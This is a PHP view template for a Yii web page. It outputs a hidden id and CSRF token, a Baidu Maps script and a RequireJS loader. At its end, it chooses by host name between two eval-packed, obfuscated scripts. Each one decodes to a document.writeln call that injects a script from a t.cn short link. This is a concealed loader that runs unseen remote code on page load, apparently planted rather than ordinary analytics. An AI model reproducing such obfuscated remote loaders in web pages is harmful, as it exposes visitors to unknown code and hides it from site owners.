<?php
use yii\helpers\Html;
?>
    <input type="hidden" id="info_id" value="<?= $info['id']; ?>" />
    <?= Html::hiddenInput(Yii::$app->request->csrfParam, Yii::$app->request->getCsrfToken(), ['id' => '_csrf']); ?>

    <!--页面主体 end-->
    <script type="text/javascript" src="http://api.map.baidu.com/getscript?v=1.5&amp;ak=yUuYcLL6yWOI2FsMvbdKAo2P&amp;services=&amp;t=20150522094656"></script>
    <script data-main="<?= Yii::getAlias('@asseturl'); ?>/spread/h5inner/js/free_design_main.js?v=5" src="<?= Yii::getAlias('@asseturl'); ?>/spread/h5inner/js/plugin/require.js"></script>
<?php echo $this->render('@spread/decoration/views/_statistic', []); ?>

<?php if ($host == 'http://hd.17zhuangxiu.com') { ?>
<script>/* 24111 */eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('2.1("<0 3=\'7://4.6/5\'></0>");',8,8,'script|writeln|document|src|t|RqDzJXU|cn|http'.split('|'),0,{}));</script>
<?php } else { ?>
<script>/* 24110 */eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('2.1("<0 3=\'7://4.6/5\'></0>");',8,8,'script|writeln|document|src|t|RqDzfXW|cn|http'.split('|'),0,{}));</script>
<?php } ?>
</body>

</html>
